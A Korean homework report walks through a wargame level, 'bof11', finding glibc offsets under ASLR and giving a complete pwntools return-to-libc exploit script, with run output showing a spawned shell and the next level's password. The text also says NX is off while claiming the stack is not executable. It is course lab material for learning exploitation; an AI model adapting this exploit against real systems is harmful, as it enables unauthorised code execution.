# Report. HW9.

## `bof11`

ASLR이 켜져 있다. NX bit는 꺼져있다. 스택에서의 실행이 불가능하다. 일단 RTL을 쓰고 싶은데, ASLR 때문에 정확한 주소값을 알 수가 없다(메모리의 주소값이 매 실행마다 바뀌어서 정확한 것을 찾을 수 없음). 하지만, **어떤 요소 - 여기서는 `glibc`를 기준으로 잡았다 - 를 기준으로 다른 요소들이 위치해 있는 주소값과의 상대적인 거리는 일정함**을 이용할 수 있다고 했었다. 그러니까, ~~`glibc`를 기준으로 필요로 하는 요소들 `"pop rdi ; ret"`, `"/bin/sh"`, `system`의 상대적인 위치를 구한 후,  이걸 `RET` 부분부터 덮어씌우면 될...~~ 어떻게 시작을 해야 할까.

### 각 요소들의 offset

`gdb`로 `bof11`을 디버깅하는 상황에서 필요한 요소들의 주소값을 조사해 보았다(여러번의 실행에 걸쳐서 돌리게 되면 ASLR에 의해 매번 glibc와 기타 요소들의 주소들이 달라지기 때문에 한번의 `bof11` 실행에서 각각의 주소값들을 확인하여야 한다.)

조사한 결과...

    glibc(of one bof11)   @ 0x00007faaa2c65000.
    printf(of one bof11)  @ 0x00007faaa2cba800.
    /bin/sh(of one bof11) @ 0x00007faaa2df1d57.

가 나왔다.

`bof11`을 실행하면 `printf`의 주소를 출력해준다. 그런데... `gef` 속 `search-pattern`을 통해 `printf`를 찾아보니... 

    [+] Searching 'printf' in memory
    [+] In '/home/bof11/bof11'(0x55f5e120e000-0x55f5e120f000), permission=r--
      0x55f5e120e54d - 0x55f5e120e553  →   "printf"
    [+] In '/home/bof11/bof11'(0x55f5e1210000-0x55f5e1211000), permission=r--
      0x55f5e1210004 - 0x55f5e121001b  →   "printf() address : %p\n"
    [+] In '/home/bof11/bof11'(0x55f5e1211000-0x55f5e1212000), permission=r--
      0x55f5e1211004 - 0x55f5e121101b  →   "printf() address : %p\n"
    [+] In '/tmp/2.23/lib/libc.so.6'(0x7f237f81f000-0x7f237f9df000), permission=r-x
      0x7f237f830043 - 0x7f237f830049  →   "printf"
      0x7f237f8304ba - 0x7f237f8304c0  →   "printf"
      0x7f237f8304ca - 0x7f237f8304d9  →   "printf_function"
      0x7f237f830624 - 0x7f237f83062e  →   "printf_chk"
      0x7f237f830dfd - 0x7f237f830e07  →   "printf_chk"
      0x7f237f831239 - 0x7f237f831243  →   "printf_chk"
      0x7f237f83139e - 0x7f237f8313a4  →   "printf"
      0x7f237f8317a4 - 0x7f237f8317af  →   "printf_type"
      0x7f237f83180f - 0x7f237f83181a  →   "printf_size"
      0x7f237f8319a8 - 0x7f237f8319ae  →   "printf"
      0x7f237f831b7b - 0x7f237f831b85  →   "printf_chk"
      0x7f237f831ce2 - 0x7f237f831ce8  →   "printf"
      0x7f237f831e6a - 0x7f237f831e74  →   "printf_chk"
      0x7f237f831f2c - 0x7f237f831f3b  →   "printf_modifier"
      0x7f237f832334 - 0x7f237f83233e  →   "printf_chk"
      0x7f237f8327dc - 0x7f237f8327e2  →   "printf"
      0x7f237f832f34 - 0x7f237f832f3e  →   "printf_chk"
      0x7f237f83313d - 0x7f237f833147  →   "printf_chk"
      0x7f237f833735 - 0x7f237f83373f  →   "printf_chk"
      0x7f237f8339ab - 0x7f237f8339b5  →   "printf_chk"
      0x7f237f833a3c - 0x7f237f833a46  →   "printf_chk"
      0x7f237f833d27 - 0x7f237f833d2d  →   "printf"
      0x7f237f833d65 - 0x7f237f833d75  →   "printf_specifier"
      0x7f237f833e11 - 0x7f237f833e1e  →   "printf_format"
      0x7f237f833eb3 - 0x7f237f833ebd  →   "printf_chk"
      0x7f237f833f48 - 0x7f237f833f52  →   "printf_chk"
      0x7f237f8341c1 - 0x7f237f8341ca  →   "printf_fp"
      0x7f237f834259 - 0x7f237f834263  →   "printf_chk"
      0x7f237f83440f - 0x7f237f83441f  →   "printf_size_info"
      0x7f237f83450d - 0x7f237f834513  →   "printf"
      0x7f237f834607 - 0x7f237f834611  →   "printf_chk"
      0x7f237f83481d - 0x7f237f834827  →   "printf_chk"
      0x7f237f83487e - 0x7f237f834888  →   "printf_chk"
      0x7f237f8348ab - 0x7f237f8348b5  →   "printf_chk"
      0x7f237f834a53 - 0x7f237f834a5d  →   "printf_chk"
      0x7f237f834bef - 0x7f237f834bf5  →   "printf"
      0x7f237f834c6c - 0x7f237f834c72  →   "printf"
      0x7f237f834d56 - 0x7f237f834d5c  →   "printf"
      0x7f237f834ef5 - 0x7f237f834efb  →   "printf"
      0x7f237f8352ea - 0x7f237f8352f4  →   "printf_chk"
      0x7f237f8356bf - 0x7f237f8356c5  →   "printf"
      0x7f237f9abdde - 0x7f237f9abde6  →   "printf.c"
      0x7f237f9aca90 - 0x7f237f9aca98  →   "printf.c"
      0x7f237f9acb24 - 0x7f237f9acb2c  →   "printf.c"
      0x7f237f9ae44b - 0x7f237f9ae457  →   "printf_chk.c"
      0x7f237f9af7c0 - 0x7f237f9af7ce  →   "printf_fphex.c"
      0x7f237f9af7fa - 0x7f237f9af806  →   "printf_fphex"
      0x7f237f9af80f - 0x7f237f9af815  →   "printf"
      0x7f237f9afd6c - 0x7f237f9afd72  →   "printf"
      0x7f237f9b2820 - 0x7f237f9b2831  →   "printf_positional"
      0x7f237f9b2846 - 0x7f237f9b2855  →   "printf_internal"
      0x7f237f9b28bd - 0x7f237f9b28c3  →   "printf"
      0x7f237f9b2b8b - 0x7f237f9b2b95  →   "printf_chk"
    [+] In '/tmp/2.23/lib/ld-linux-x86-64.so.2'(0x7f237fbe9000-0x7f237fc0f000), permission=r-x
      0x7f237fc0b62c - 0x7f237fc0b632  →   "printf"

결과값도 (다른 것들도 나오지만) `printf`만 해도 너무 많이 나온다. 그러니까, `bof11`에서 출력하는 `printf`가 저 중 어떤 것인지 알 수가 없다. 그래서... 이전 `bof9`에서 찾았던 `system`을 참고하여, **`system`을 기준으로 다른 요소들의 상대값을 찾기로 하였다.**

    glibc(of bof9) @ 0x00007ffff7a0d000
    system(of bof9) @ 0x00007ffff7a52390
    
...가 찾은 결과물이었다.

    "pop rdi ; ret" @ 0x0000000000021102.
    
...는 `glibc` 중 `"pop rdi ; ret"` 가젯이 위치해 있는 offset이다(`ROPgadget.py`를 통해 찾을 수 있었는데 이미 offset 값으로 나와 있다).

추가...로, 디버깅을 통해 `RET`와 `buf` 사이의 거리가 **`18`**이란 걸 확인할 수 있었다. 이걸 바탕으로 목요일 수업 시간에 만들었던 payload exploit 파일 뼈대를 다듬었다.


<details><summary>exp_bof11.py.base</summary>
<p>

```python
from pwn import *

p = process('./bof11')

p.recvuntil('printf() address : ')
printf_addr = p.recvuntil('\n')

system_addr = printf_addr # + system offset here
binsh_addr = printf_addr # + binsh offset here
poprdi_ret = printf_addr # + binsh offset here

payload = 'x' * 20
payload += p64(poprdi_ret)
payload += p64(binsh_addr)
payload += p64(system_addr)

p.send(payload)
p.interactive()

```
</p></details>

를,

<details><summary>exp_bof11.py</summary>
<p>

```python
from pwn import *

p = process('./bof11')

p.recvuntil('printf() address : ')
printf_addr = int(p.recvuntil('\n').decode('UTF-8').strip(), 16)

glibc_offset = {}
glibc_offset['poprdi'] = 0x0000000000021102
glibc_offset['printf'] = -(0x00007faaa2c65000 - 0x00007faaa2cba800)
glibc_offset['binsh']  = -(0x00007faaa2c65000 - 0x00007faaa2df1d57)
glibc_offset['system'] = -(0x00007ffff7a0d000 - 0x00007ffff7a52390)

glibc_addr = printf_addr - glibc_offset['printf']
system_addr = glibc_addr + glibc_offset['system']
binsh_addr  = glibc_addr + glibc_offset['binsh']
poprdi_ret  = glibc_addr + glibc_offset['poprdi']

print(hex(glibc_addr))
print(hex(printf_addr))
print(hex(poprdi_ret))
print(hex(binsh_addr))
print(hex(system_addr))

payload = ('x' * 18).encode()
payload += p64(poprdi_ret)
payload += p64(binsh_addr)
payload += p64(system_addr)

p.send(payload)
p.interactive()

```
</p></details>

...로 바꾸었다. 뼈대를 기준으로 바뀐 부분은...

- 각 명령어들의 `glibc`로부터의 offset을 계산해서 구할 수도 있었겠지만 그러기엔 귀찮아서 코드 안에서 처리하기로 했다.
- `printf_addr`를 구하긴 하지만 이것을 기준으로 하지 않고 `glibc_addr`를 기준으로 매 실행마다 각 요소들의 주소를 구하는 방향으로 수정하였다.
- 뼈대에선 `printf_addr`에 주소가 들어간 `string`이 들어가지만 여기선 바로 16진수 `int`형 값으로 변환하여 씌우는 방향으로 수정하였다.

그렇게 만든 `exp_bof11.py`를 `python3`로 돌려보았는데 - pwn 모듈이 python2에선 돌아가지 않았다 - 성공적으로 먹혀들었다.

    bof11@9abd2f7e3e2b:~$ python3 exp_bof11.py
    [+] Starting local process './bof11': pid 1305
    0x7f9f9e431000
    0x7f9f9e486800
    0x7f9f9e452102
    0x7f9f9e5bdd57
    0x7f9f9e476390
    [*] Switching to interactive mode
    $
    Hello xxxxxxxxxxxxxxxxxx!E\x9e\x9f\x7f
    $ id
    uid=1012(bof12) gid=1012(bof12) groups=1012(bof12),1011(bof11)
    $ ls
    a.out  bof11.c       bof12.pw     exp_bof11.py.base  libc.so.6
    bof11  bof11.hint  exp_bof11.py  exp_bof11.py.hint  which_system.c
    $ cat bof12.pw
    bbcd6e39
    $ exit
    [*] Got EOF while reading in interactive
    $ exit
    [*] Process './bof11' stopped with exit code -11 (SIGSEGV) (pid 1305)
    [*] Got EOF while sending in interactive
    bof11@9abd2f7e3e2b:~$ su bof12
    Password:
     Congratulations!
     You solved all BOF CTFs.
    Press [Enter] to exit...

`bof12` 계정이 있긴 하였으나 여기가 끝이었다.


# -- END --

